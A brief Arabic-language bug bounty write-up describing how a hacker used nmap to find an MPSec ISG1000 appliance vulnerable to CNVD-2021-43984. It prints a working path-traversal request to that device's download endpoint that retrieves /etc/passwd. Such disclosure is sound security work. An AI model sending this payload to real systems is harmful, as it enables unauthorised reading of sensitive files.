
this is a [writeup](# How i got my name featured on Nebraska University Hall Of Fame.)


الفكرة كلها ان الهاكر وهو بيعمل `scan` علي البورتات والخدمات اللي شغالة علي التارجت بأستخدام أداة `nmap` لقا أنهم بيستخدمو جهاز `MPSec ISG1000` وده جهاز بيستخدم لحماية الشبكة ولكن بعد البحث عليه لقي ان ليه ثغرة أمنية خطيرة **(CNVD-2021–43984)** تتيح للمهاجمين تنزيل ملفات حساسة بدون إذن.

فهو بيعمل ريكون لقي ال `endpoint` دي
```HTTP
https://[target]/webui/?g=sys_dia_data_down&file_name=example.txt
```
ف غيره ل ده
```HTTP
https://[target]/webui/?g=sys_dia_data_down&file_name=../../../../../../etc/passwd
```
و فعلا جاب الملف

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*GJkVN-6VvPmqzYqlb0avTA.jpeg)
